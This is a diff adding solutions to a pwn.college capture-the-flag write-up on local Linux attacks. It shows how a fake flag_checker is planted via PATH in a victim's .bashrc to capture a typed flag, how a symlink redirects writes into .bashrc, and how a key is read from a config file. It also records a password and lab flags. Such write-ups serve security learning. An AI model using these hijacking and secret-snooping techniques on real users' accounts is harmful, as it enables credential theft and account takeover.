@@ -225,41 +225,69 @@ nano .bashrc
 /challenge/victim
 ```
 >Flag :pwn.college{U2dTSoOw-_qNs-ivnnsmcxe2WPt.0VMzEzNxwyNwcTNxEzW}
-### 1.3.2 : 
+### 1.3.2 : Sniffing Input
+This time, Zardus doesn't keep the flag lying around in a readable file after he logs in. Instead he'll run a command named flag_checker, manually typing the flag into it for verification.
 
+Your mission is to use your continued write access to Zardus's .bashrc to intercept this flag. Remember how you hijacked commands in the Pondering PATH module? Can you use that capability to hijack the flag_checker?
 #### Solving :
+Since it was mentioned similar to pondering paths ,i created a flag_checker command in my home directory and changed the  PATH env to ~ in .bashrc of zardus .The following is the flag_checker command
 ```
-
+echo "Type the flag"
+read flagg
+echo "$flagg"
 ```
->Flag :
-### 1.3.3 : 
+The .bashrc in /home/zardus
+```
+# this sets up a scary red shell prompt!
+PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '
 
+# add your attack below this line!
+export PATH="/home/hacker"
+```
+![alt text](image-1.png)
+>Flag :pwn.college{M0kdZoLh20lV5Ne-qKmvOK6-Jce.0VNzEzNxwyNwcTNxEzW}
+
+### 1.3.3 : Overshared Directories
+In this challenge, for convenience, Zardus opened up his home directory:
+
+zardus@dojo:~$ chmod a+w /home/zardus
+As you know, there are lots of sensitive files in that directory such as .bashrc! Can you replicate the previous attack with write access to /home/zardus instead of /home/zardus/.bashrc?
 #### Solving :
-```
-
-```
->Flag :
+chmod a+w /home/zardus gives write permission for all users.So i just deleted the existing .bashrc since the original .bashrc had write only permissions and copy pasted the .bashrc from previous question 
+![alt text](image-2.png)
+>Flag :pwn.college{oigzwO9_XAHWYri9b4bYAw0K0Id.0FM0EzNxwyNwcTNxEzW}
 ### 1.3.4 : 
+Recall from the previous level that, having write access to /tmp/collab, the hacker user can replace that evil-commands.txt file. Also remember from Comprehending Commands that files can link to other files. What happens if hacker replaces evil-commands.txt with a symbolic link to some sensitive file that zardus can write to? Chaos and shenanigans!
+
+You know the file to link to. Pull off the attack, and get /flag (which, for this level, Zardus can read again!).
+#### Solving :
+It was mentioned we have to run /challenge/victim twice so i figured we have to write cat /flag in .bashrc and then on running it the second time we get the flag .So i created a symbolic link from .txt file which has write access to .bashrc 
+```
+rm /tmp/collab/evil-commands.txt
+ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
+```
+![alt text](image-3.png)
+>Flag :pwn.college{U5V11WVXX-D_f6aNXBnZcbfvXvN.0VM0EzNxwyNwcTNxEzW}
+### 1.3.5 : Sniffing process arguments
 
 #### Solving :
+![alt text](image-4.png)
 ```
-
+cd /challenge
+su zardus
+pw_77013684
+sudo cat /flag
 ```
->Flag :
-### 1.3.5 : 
-
+>Flag :pwn.college{YAuF9tfSxg-PvaE5WxjL5KaaV-v.0FOzEzNxwyNwcTNxEzW}
+### 1.3.6 : Snooping on configuration
+Naturally, Zardus stores his key in .bashrc. Can you steal the key and get the flag?
 #### Solving :
 ```
-
+cd /home/zardus
+cat .bashrc
+flag_getter --key sk-1420626432
 ```
->Flag :
-### 1.3.6 : 
-
-#### Solving :
-```
-
-```
->Flag :
+>Flag :pwn.college{QStfOH926zSDHknzTwgRqJfJmTz.0lM0EzNxwyNwcTNxEzW}
 
 
 # 2.Webex
